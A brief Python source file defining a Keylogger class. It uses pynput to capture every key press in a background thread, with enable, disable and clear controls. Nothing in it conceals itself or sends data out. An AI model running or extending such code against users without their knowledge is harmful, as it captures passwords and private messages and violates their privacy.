from pynput.keyboard import Listener, Key
from threading import Thread


class Keylogger:

    __log = []
    __enabled = False

    def __init__(self):
        def on_press(key):
            if not self.__enabled: return
            self.__log.append(key)
        def listener_setup():
            with Listener(on_press=on_press) as listener:
                listener.join()
        Thread(target=listener_setup).start()

    def clear_log(self):
        self.__log = []

    def enable(self):
        self.__enabled = True

    def disable(self):
        self.__enabled = False

    @property
    def log(self) -> list[Key | str]:
        return self.__log

    @log.setter
    def log(self, value):
        raise PermissionError("Value could not be set due to value being read-only!")